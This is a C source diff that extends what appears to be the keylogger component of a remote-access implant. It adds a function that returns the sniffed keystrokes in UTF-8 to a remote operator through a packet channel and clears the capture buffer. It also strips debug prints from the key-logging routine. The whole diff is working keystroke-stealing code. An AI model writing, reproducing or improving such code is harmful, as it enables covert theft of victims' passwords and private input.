@@ -254,6 +254,31 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 }
 
 /*
+* Returns the sniffed keystrokes (UTF8)
+*/
+
+DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
+{
+	Packet *response = packet_create_response(request);
+	DWORD result = ERROR_SUCCESS;
+	char *utf8_keyscan_buf = NULL;
+
+	if (tKeyScan) {
+		utf8_keyscan_buf = wchar_to_utf8(keyscan_buf);
+		packet_add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf, strlen(utf8_keyscan_buf)+1);
+		memset(keyscan_buf, 0, KEYBUFSIZE);
+		idx = 0;
+	}
+	else {
+		result = 1;
+	}
+
+	// Transmit the response
+	packet_transmit_response(result, remote, response);
+	return ERROR_SUCCESS;
+}
+
+/*
  * log keystrokes
  */
 
@@ -292,10 +317,8 @@ int ui_log_key(UINT vKey)
 		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Tab>");
 		break;
 	default:
-		printf("[+] vKey %lc [0x%x] idx: %d\n", vKey, vKey, idx);
 		if (ToUnicodeEx(vKey, MapVirtualKey(vKey, 0), lpKeyboard, kb, 16, 0, NULL) == 1)
 		{
-			printf("[+] kb: 0x%x\n", *kb);
 			if ((UINT)vKey <= 0x1f)
 			{
 				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", c0_ascii[vKey]);
@@ -305,7 +328,6 @@ int ui_log_key(UINT vKey)
 			{
 				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", kb);
 			}
-			printf("[+] keyscan_buf:\n%ls\n", keyscan_buf);
 		}
 	}
 	return 0;
